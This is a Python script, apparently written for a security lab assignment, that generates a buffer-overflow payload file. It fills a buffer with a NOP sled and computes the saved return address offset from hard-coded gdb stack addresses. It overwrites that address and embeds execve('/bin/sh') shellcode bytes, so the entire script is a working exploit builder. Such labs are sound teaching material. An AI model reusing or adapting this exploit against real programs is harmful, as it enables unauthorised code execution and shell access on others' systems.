# hyper parameters
BADFILE_LENGTH = 200
N_BYTES_PER_ADDRESS = 4

# prepare shellcode
shellcode = b"\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80"

# create badfile with NOP (0x90)
badfile = bytearray(0x90 for _ in range(BADFILE_LENGTH))

print("length of badfile is", BADFILE_LENGTH)
print("number of bytes per address is", N_BYTES_PER_ADDRESS)
print("shellcode is", shellcode)
print("length of shellcode is", len(shellcode))


"""TASK A
Modify Return Address
"""
print("\n", "-"*20, "TASK A", "-"*20, "\n")
# compute offset of "Return Address" using memory address in gdb
address_of_target_str = 0xffffce4c  # (1) the address of target_string
address_of_ebp = 0xffffceb8  # (2) the address of ebp

# offset of return_address in the badfile
address_of_return_address = address_of_ebp + N_BYTES_PER_ADDRESS
offset_of_return_address_in_buffer = address_of_return_address - address_of_target_str
print("offset of return address in the buffer is", offset_of_return_address_in_buffer)

# set new value for the "Return Address"
# address_of_shellcode = address_of_return_address + N_BYTES_PER_ADDRESS  # the lowest address above return address and 
address_of_shellcode = address_of_target_str + BADFILE_LENGTH - len(shellcode) # the highest address (the end of the buffer)
print("content of the malicious return address is", hex(address_of_shellcode))

# modify the return address
badfile[offset_of_return_address_in_buffer : offset_of_return_address_in_buffer + N_BYTES_PER_ADDRESS] = address_of_shellcode.to_bytes(N_BYTES_PER_ADDRESS, "little")

"""TASK B
Inject Malicious Code
"""
print("\n", "-"*20, "TASK B", "-"*20, "\n")
# offset of the shellcode in the badfile
offset_of_shellcode_in_buffer = address_of_shellcode - address_of_target_str

# fill in the shellcode
badfile[offset_of_shellcode_in_buffer : offset_of_shellcode_in_buffer + len(shellcode)] = shellcode
print("offset of shellcode in the buffer is", offset_of_shellcode_in_buffer)

# Write the badfile to a file
with open("badfile", "wb") as f:
    f.write(badfile)
